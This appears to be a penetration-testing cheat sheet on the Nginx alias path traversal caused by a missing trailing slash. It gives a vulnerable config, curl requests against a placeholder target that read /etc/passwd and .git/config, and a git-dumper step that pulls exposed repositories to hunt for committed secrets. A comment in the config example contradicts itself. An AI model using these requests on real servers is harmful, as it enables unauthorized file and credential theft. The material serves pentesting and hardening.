# Nginx Alias Traversal (Missing Trailing Slash)

When an Nginx `location` block uses `alias` but the location path lacks a trailing slash, a path traversal is possible: appending `../` to the URL walks out of the aliased directory.

```nginx
# vulnerable config:
location /files {
    alias /var/www/uploads/;
}
# /files../etc/passwd -> serves /var/www/uploads/../etc/passwd -> /var/www/etc/passwd? No:
# actual traversal: /files../  -> alias resolves to /var/www/uploads/../ -> /var/www/
```

```bash
# test by appending ../ after the location path (no slash between the path and ..)
curl http://<TARGET>/files../etc/passwd
curl http://<TARGET>/files../.git/config    # check for exposed git repo
```

If `.git/` is reachable, dump the full repo:
```bash
git-dumper http://<TARGET>/files../.git/ ./dumped-repo
cd dumped-repo && git log --oneline   # look for committed secrets
```

Detection: `nikto` and `ffuf` with a `../` suffix paylist both catch this, but a manual check is reliable since the vector is always the missing-slash aliased location.
